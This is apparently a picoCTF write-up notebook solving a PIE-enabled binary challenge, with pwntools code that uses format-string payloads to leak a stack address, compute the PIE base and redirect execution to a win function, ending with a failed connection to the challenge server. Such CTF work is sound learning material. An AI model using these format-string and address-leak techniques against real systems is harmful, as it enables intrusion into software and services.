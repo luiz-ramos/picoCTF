{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "f39449a5",
   "metadata": {},
   "source": [
    "First, we check what kind of security features are enabled into the binary:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "cfb54cc3",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "RELRO:      Full RELRO\n",
      "Stack:      Canary found\n",
      "NX:         NX enabled\n",
      "PIE:        PIE enabled\n",
      "SHSTK:      Enabled\n",
      "IBT:        Enabled\n",
      "Stripped:   No\n"
     ]
    }
   ],
   "source": [
    "from pwn import *\n",
    "\n",
    "vuln = context.binary = ELF('vuln', checksec=False)\n",
    "print(vuln.checksec())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f16974e5",
   "metadata": {},
   "source": [
    "As expected from the challenge name, PIE is enabled, which means we will need two things:\n",
    "\n",
    "1) The address of any given function at runtime.\n",
    "2) The offset between that function and the win function in the .plt.got binary section.\n",
    "\n",
    "Requirement 2 is easy enough to get with the pwn package. For now, we will save the `win` function's address:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "83eb5098",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x136a\n"
     ]
    }
   ],
   "source": [
    "win_offset = vuln.symbols['win']\n",
    "\n",
    "print(hex(win_offset))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bae383b1",
   "metadata": {},
   "source": [
    "Now, we will need to mess around with the buffer input in order to get an idea of the runtime address of the process. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "d873c231",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Enter your name:\n",
      "AAAAAAAAb73182a1.fbad2088.48ce7d5f.b73182db.00000000.faa9efd0.00000000.41414141.78383025.30252e78.\n",
      " enter the address to jump to, ex => 0x12345:\n",
      " Segfault Occurred, incorrect address.\n",
      "\n"
     ]
    }
   ],
   "source": [
    "io = process('./vuln')\n",
    "print(io.recvuntil(b':').decode())\n",
    "\n",
    "payload = 'A' * 8 + '%08x.' * 10\n",
    "io.sendline(payload.encode())\n",
    "print(io.recvuntil(b':').decode())\n",
    "io.sendline(b'0x0000')\n",
    "print(io.recvall().decode())\n",
    "io.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0a570fd9",
   "metadata": {},
   "source": [
    "We can see that the buffer's address lies in the location of the 8th parameter call of the `printf` function, as evidenced by the output. \n",
    "That might be of use, but what would really help right now is if one of the addresses leaked by the input string can be dereferenced to reach the buffer.\n",
    "\n",
    "To test that, we will need to check each address in the function stack:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "760805a7",
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(30):\n",
    "    io = process('./vuln')\n",
    "    io.recvuntil(b':')\n",
    "    payload = 'A' * 8 + '|%' + str(i) + '$s|'\n",
    "    io.sendline(payload.encode())\n",
    "    try:\n",
    "        out = io.recvuntil(b':').decode()\n",
    "    except:\n",
    "        continue\n",
    "    if '|A' in out:\n",
    "        print(i)\n",
    "        print(out)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cb9a8bbe",
   "metadata": {},
   "source": [
    "By the lack of an output, it seems we had no luck with the buffer address. However, the `printf` stack frame might also contain some function's address. \n",
    "To test that: "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "cfef21a9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "21\n",
      " \n",
      "23\n",
      " Enter your name:\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import re\n",
    "\n",
    "for i in range(30):\n",
    "    io = process('./vuln')\n",
    "    io.recvuntil(b':')\n",
    "    payload = 'A' * 8 + '|%' + str(i) + '$p|'\n",
    "    io.sendline(payload.encode())\n",
    "    try:\n",
    "        out = io.recvuntil(b':').decode()\n",
    "        match = re.search(r'0x[0-9a-fA-F]+', out)\n",
    "        if match:\n",
    "            address = match.group(0)\n",
    "            io.sendline(address.encode())\n",
    "            out = io.recvline().decode()\n",
    "    except:\n",
    "        print('ErrorByte')\n",
    "    if 'Segfault' not in out:\n",
    "        print(i)\n",
    "        print(out)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ee53aa3b",
   "metadata": {},
   "source": [
    "So (luckily) we ended up finding the address of some function through the leaked stack. \\\n",
    "However, due to the structure of the code, its hard to determine exactly WHICH function's address it is. \\\n",
    "There are three possibilities: the call site of the `printf` function inside `call_functions`; the actual runtime address of `call_functions`;\n",
    "or even the runtime address of `main`.\n",
    "\n",
    "This can be solved using GDB to determine which function's address matches the one we get from the leaked stack. From it, we conclude that it is actually main's address that we get! \n",
    "\n",
    "Now, it is a simple matter of combining requirements 1) and 2):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "b679d848",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " enter the address to jump to, ex => 0x12345: 0x5636639dc36a\n",
      " You won!\n",
      "Cannot open file.\n",
      "\n"
     ]
    }
   ],
   "source": [
    "main_offset = vuln.symbols['main']\n",
    "\n",
    "for i in range(30):\n",
    "    io = process('./vuln')\n",
    "    io.recvuntil(b':')\n",
    "    payload = 'A' * 8 + '|%' + str(i) + '$p|'\n",
    "    io.sendline(payload.encode())\n",
    "    try:\n",
    "        out = io.recvuntil(b':').decode()\n",
    "        match = re.search(r'0x[0-9a-fA-F]+', out)\n",
    "        if match:\n",
    "            leaked_address = match.group(0)\n",
    "            io.sendline(leaked_address.encode())\n",
    "            out = io.recvline().decode()\n",
    "    except:\n",
    "        continue\n",
    "    if 'Enter' in out:\n",
    "        print(io.recvuntil(b':').decode(), end=' ')\n",
    "        leaked_address = int(leaked_address, 16)\n",
    "        pie_base = leaked_address - main_offset\n",
    "        payload = pie_base + win_offset\n",
    "        print(hex(payload))\n",
    "        io.sendline(hex(payload).encode())\n",
    "        print(io.recvall().decode())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2feaafcc",
   "metadata": {},
   "source": [
    "We can simply repeat the process to get the flag from the picoCTF server (the port variable is specific to each attempt):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "6f1832cc",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ERROR] Could not connect to rescued-float.picoctf.net on port 54048\n"
     ]
    },
    {
     "ename": "PwnlibException",
     "evalue": "Could not connect to rescued-float.picoctf.net on port 54048",
     "output_type": "error",
     "traceback": [
      "\u001b[31m---------------------------------------------------------------------------\u001b[39m",
      "\u001b[31mPwnlibException\u001b[39m                           Traceback (most recent call last)",
      "\u001b[36mCell\u001b[39m\u001b[36m \u001b[39m\u001b[32mIn[35]\u001b[39m\u001b[32m, line 5\u001b[39m\n\u001b[32m      2\u001b[39m port = \u001b[32m54048\u001b[39m\n\u001b[32m      4\u001b[39m \u001b[38;5;28;01mfor\u001b[39;00m i \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28mrange\u001b[39m(\u001b[32m30\u001b[39m):\n\u001b[32m----> \u001b[39m\u001b[32m5\u001b[39m     io = \u001b[43mremote\u001b[49m\u001b[43m(\u001b[49m\u001b[33;43m'\u001b[39;49m\u001b[33;43mrescued-float.picoctf.net\u001b[39;49m\u001b[33;43m'\u001b[39;49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mport\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m      6\u001b[39m     io.recvuntil(\u001b[33mb\u001b[39m\u001b[33m'\u001b[39m\u001b[33m:\u001b[39m\u001b[33m'\u001b[39m)\n\u001b[32m      7\u001b[39m     payload = \u001b[33m'\u001b[39m\u001b[33mA\u001b[39m\u001b[33m'\u001b[39m * \u001b[32m8\u001b[39m + \u001b[33m'\u001b[39m\u001b[33m|\u001b[39m\u001b[33m%\u001b[39m\u001b[33m'\u001b[39m + \u001b[38;5;28mstr\u001b[39m(i) + \u001b[33m'\u001b[39m\u001b[33m$p|\u001b[39m\u001b[33m'\u001b[39m\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~/Workspace/CYBSEC/venv/lib/python3.13/site-packages/pwnlib/tubes/remote.py:85\u001b[39m, in \u001b[36mremote.__init__\u001b[39m\u001b[34m(self, host, port, fam, typ, sock, ssl, ssl_context, ssl_args, sni, *args, **kwargs)\u001b[39m\n\u001b[32m     83\u001b[39m fam = \u001b[38;5;28mself\u001b[39m._get_family(fam)\n\u001b[32m     84\u001b[39m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[32m---> \u001b[39m\u001b[32m85\u001b[39m     \u001b[38;5;28mself\u001b[39m.sock   = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_connect\u001b[49m\u001b[43m(\u001b[49m\u001b[43mfam\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mtyp\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m     86\u001b[39m \u001b[38;5;28;01mexcept\u001b[39;00m socket.gaierror \u001b[38;5;28;01mas\u001b[39;00m e:\n\u001b[32m     87\u001b[39m     \u001b[38;5;28;01mif\u001b[39;00m e.errno != socket.EAI_NONAME:\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~/Workspace/CYBSEC/venv/lib/python3.13/site-packages/pwnlib/tubes/remote.py:134\u001b[39m, in \u001b[36mremote._connect\u001b[39m\u001b[34m(self, fam, typ)\u001b[39m\n\u001b[32m    132\u001b[39m     \u001b[38;5;28;01mexcept\u001b[39;00m socket.error:\n\u001b[32m    133\u001b[39m         \u001b[38;5;28;01mpass\u001b[39;00m\n\u001b[32m--> \u001b[39m\u001b[32m134\u001b[39m \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43merror\u001b[49m\u001b[43m(\u001b[49m\u001b[33;43m\"\u001b[39;49m\u001b[33;43mCould not connect to \u001b[39;49m\u001b[38;5;132;43;01m%s\u001b[39;49;00m\u001b[33;43m on port \u001b[39;49m\u001b[38;5;132;43;01m%s\u001b[39;49;00m\u001b[33;43m\"\u001b[39;49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43mrhost\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43mrport\u001b[49m\u001b[43m)\u001b[49m\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~/Workspace/CYBSEC/venv/lib/python3.13/site-packages/pwnlib/log.py:439\u001b[39m, in \u001b[36mLogger.error\u001b[39m\u001b[34m(self, message, *args, **kwargs)\u001b[39m\n\u001b[32m    432\u001b[39m \u001b[38;5;250m\u001b[39m\u001b[33;03m\"\"\"error(message, *args, **kwargs)\u001b[39;00m\n\u001b[32m    433\u001b[39m \n\u001b[32m    434\u001b[39m \u001b[33;03mTo be called outside an exception handler.\u001b[39;00m\n\u001b[32m    435\u001b[39m \n\u001b[32m    436\u001b[39m \u001b[33;03mLogs an error message, then raises a ``PwnlibException``.\u001b[39;00m\n\u001b[32m    437\u001b[39m \u001b[33;03m\"\"\"\u001b[39;00m\n\u001b[32m    438\u001b[39m \u001b[38;5;28mself\u001b[39m._log(logging.ERROR, message, args, kwargs, \u001b[33m'\u001b[39m\u001b[33merror\u001b[39m\u001b[33m'\u001b[39m)\n\u001b[32m--> \u001b[39m\u001b[32m439\u001b[39m \u001b[38;5;28;01mraise\u001b[39;00m PwnlibException(message % args)\n",
      "\u001b[31mPwnlibException\u001b[39m: Could not connect to rescued-float.picoctf.net on port 54048"
     ]
    }
   ],
   "source": [
    "main_offset = vuln.symbols['main']\n",
    "port = 54048\n",
    "\n",
    "for i in range(30):\n",
    "    io = remote('rescued-float.picoctf.net', port)\n",
    "    io.recvuntil(b':')\n",
    "    payload = 'A' * 8 + '|%' + str(i) + '$p|'\n",
    "    io.sendline(payload.encode())\n",
    "    try:\n",
    "        out = io.recvuntil(b':').decode()\n",
    "        match = re.search(r'0x[0-9a-fA-F]+', out)\n",
    "        if match:\n",
    "            leaked_address = match.group(0)\n",
    "            io.sendline(leaked_address.encode())\n",
    "            out = io.recvline().decode()\n",
    "    except:\n",
    "        continue\n",
    "    if 'Enter' in out:\n",
    "        print(io.recvuntil(b':').decode(), end=' ')\n",
    "        leaked_address = int(leaked_address, 16)\n",
    "        pie_base = leaked_address - main_offset\n",
    "        payload = pie_base + win_offset\n",
    "        print(hex(payload))\n",
    "        io.sendline(hex(payload).encode())\n",
    "        print(io.recvall().decode())"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.13.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
